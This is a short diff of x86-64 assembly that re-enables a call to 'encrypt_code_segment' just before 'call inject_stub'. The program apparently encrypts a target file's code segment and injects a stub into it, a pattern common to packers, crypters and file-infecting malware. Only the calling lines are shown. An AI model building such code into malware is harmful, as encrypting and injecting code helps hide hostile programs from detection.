@@ -135,7 +135,7 @@ _start:
     
     lea     rdi, [file_ptr]
     add     rdi, [code_segment_offset]
-    ; call    encrypt_code_segment   ; Encrypt the whole code segment
+    call    encrypt_code_segment   ; Encrypt the whole code segment
 
     call    inject_stub
 
